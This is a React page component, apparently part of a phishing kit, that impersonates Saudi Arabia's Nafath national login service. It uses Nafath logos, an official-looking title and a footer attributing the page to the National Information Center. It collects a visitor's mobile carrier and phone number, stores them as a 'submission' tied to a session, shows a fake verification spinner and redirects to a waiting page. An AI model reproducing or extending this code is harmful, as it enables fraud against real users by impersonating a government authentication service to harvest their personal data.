import { useState } from "react";
import { useLocation } from "wouter";
import { addSubmission } from "@/lib/submissions";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";


const nafathLogo = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Nafath_logo.svg/3840px-Nafath_logo.svg.png";


const SAUDI_TELECOM_COMPANIES = [
  { value: "", label: "اختر مزود الخدمة" },
  { value: "stc", label: "STC (الاتصالات السعودية)" },
  { value: "mobily", label: "Mobily (موبايلي)" },
  { value: "zain", label: "Zain (زين)" },
  { value: "jawra", label: "Jawra (جوال)" },
];


export default function Nomer() {
  const [, setLocation] = useLocation();
  
  const [provider, setProvider] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");


  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!provider) {
      setError("يرجى اختيار مزود الخدمة");
      return;
    }
    
    if (phone.length < 9 || phone.length > 10) {
      setError("رقم الهاتف يجب أن يكون بين 9 و 10 أرقام");
      return;
    }


    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }


    setLoading(true);
    setError("");
    
    try {
      addSubmission("nomer", sessionId, { provider, phone });
      
      setTimeout(() => {
        setLocation("/nomer-wait");
      }, 2000);
    } catch {
      setLoading(false);
      setError("حدث خطأ أثناء الإرسال");
    }
  };


  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#f8fafc",
        display: "flex",
        flexDirection: "column",
        fontFamily: "system-ui, -apple-system, sans-serif",
        color: "#1e293b",
        boxSizing: "border-box"
      }}
      dir="rtl"
    >
      <header
        style={{
          backgroundColor: "#ffffff",
          borderBottom: "1px solid #f1f5f9",
          padding: "14px 20px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          boxShadow: "0 1px 2px rgba(0,0,0,0.03)"
        }}
      >
        <img src={nafathLogo} alt="نفاذ" style={{ height: "26px", objectFit: "contain" }} />
        <span style={{ fontSize: '11px', fontWeight: 'bold', color: '#94a3b8', fontFamily: 'monospace' }}>
          SECURE NODE v8
        </span>
      </header>
      
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            style={{
              position: "fixed",
              inset: 0,
              backgroundColor: "rgba(255,255,255,0.97)",
              zIndex: 50,
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              justifyContent: "center",
              padding: "20px"
            }}
          >
            <Loader2 style={{ width: "56px", height: "56px", color: "#11998E", animation: "spin 1s linear infinite", marginBottom: "20px" }} />
            <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#1e293b", margin: "0", textAlign: "center" }}>جارٍ التحقق من الرقم...</h2>
            <p style={{ color: "#64748b", marginTop: "8px", fontSize: "13px", textAlign: "center" }}>يرجى عدم إغلاق هذه الصفحة</p>
          </motion.div>
        )}
      </AnimatePresence>


      <div style={{ flex: 1, display: "flex", justifyContent: "center", alignItems: "center", padding: "24px 16px", boxSizing: "border-box" }}>
        <div style={{ backgroundColor: "#ffffff", borderRadius: "24px", border: "1px solid #e2e8f0", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)", padding: "32px 24px", width: "100%", maxWidth: "400px", boxSizing: "border-box" }}>
          
          <img src={nafathLogo} alt="Nafath" style={{ height: "40px", margin: "0 auto 24px auto", objectFit: "contain" }} />
          
          <h2 style={{ fontSize: "18px", fontWeight: "bold", color: "#1e293b", marginBottom: "4px", marginTop: "0", textAlign: "center" }}>النفاذ الوطني</h2>
          <p style={{ color: "#64748b", marginBottom: "24px", fontSize: "13px", textAlign: "center", marginTop: "0" }}>يرجى توثيق رقم الجوال</p>
          
          {error && (
            <div style={{ backgroundColor: "#fef2f2", color: "#dc2626", padding: "12px", borderRadius: "14px", marginBottom: "20px", border: "1px solid #fca5a5", fontSize: "13px", fontWeight: "600", textAlign: "center" }}>
              {error}
            </div>
          )}


          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
              <label style={{ fontSize: "13px", fontWeight: "bold", color: "#475569" }}>
                مزود الخدمة
              </label>
              <select
                value={provider}
                onChange={e => setProvider(e.target.value)}
                style={{
                  width: "100%",
                  borderRadius: "14px",
                  border: "2px solid #cbd5e1",
                  backgroundColor: "#f8fafc",
                  padding: "12px 14px",
                  fontSize: "14px",
                  color: "#1e293b",
                  outline: "none",
                  boxSizing: "border-box"
                }}
                required
              >
                {SAUDI_TELECOM_COMPANIES.map(company => (
                  <option key={company.value} value={company.value}>
                    {company.label}
                  </option>
                ))}
              </select>
            </div>


            <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
              <label style={{ fontSize: "13px", fontWeight: "bold", color: "#475569" }}>
                رقم الهاتف
              </label>
              <input 
                type="tel" 
                inputMode="numeric" 
                pattern="[0-9]*"
                required 
                value={phone} 
                onChange={e => setPhone(e.target.value.replace(/\D/g, "").substring(0, 10))} 
                placeholder="5XXXXXXXX"
                dir="ltr"
                maxLength={10}
                minLength={9}
                style={{
                  width: "100%",
                  textAlign: "center",
                  fontSize: "20px",
                  fontWeight: "bold",
                  height: "50px",
                  borderRadius: "14px",
                  border: "2px solid #cbd5e1",
                  backgroundColor: "#f8fafc",
                  outline: "none",
                  boxSizing: "border-box",
                  WebkitAppearance: "none"
                }}
              />
              <p style={{ fontSize: "11px", color: "#94a3b8", margin: "4px 0 0 0", textAlign: "center" }}>أدخل رقم الجوال (9-10 أرقام)</p>
            </div>


            <button 
              type="submit" 
              disabled={loading}
              style={{
                width: "100%",
                height: "50px",
                fontSize: "16px",
                fontWeight: "bold",
                backgroundColor: "#11998E",
                color: "#ffffff",
                borderRadius: "14px",
                border: "none",
                cursor: "pointer",
                boxShadow: "0 4px 12px rgba(17, 153, 142, 0.2)",
                transition: "background-color 0.2s",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "8px"
              }}
            >
              {loading ? (
                <>
                  <Loader2 style={{ width: "20px", height: "20px", animation: "spin 1s linear infinite" }} />
                  جارٍ الإرسال...
                </>
              ) : (
                "إرسال"
              )}
            </button>
          </form>
        </div>
      </div>


      <footer style={{ backgroundColor: "#f1f5f9", borderTop: "1px solid #e2e8f0", padding: "16px 20px" }}>
        <div
          style={{
            maxWidth: "400px",
            margin: "0 auto",
            display: "flex",
            flexDirection: "row",
            justifyContent: "space-between",
            alignItems: "center",
            gap: "12px"
          }}
        >
          <div style={{ textAlign: "right" }}>
            <h6 style={{ fontWeight: "bold", fontSize: "12px", color: "#1e293b", margin: "0 0 2px 0" }}>
              مركز المعلومات الوطني
            </h6>
            <p style={{ fontSize: "10px", color: '#94a3b8', margin: "0" }}>
              جميع الحقوق محفوظة © {new Date().getFullYear()}
            </p>
          </div>
          <div>
            <img src={nafathLogo} alt="NIC" style={{ height: "28px", opacity: "0.5", filter: "grayscale(100%)" }} />
          </div>
        </div>
      </footer>


      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
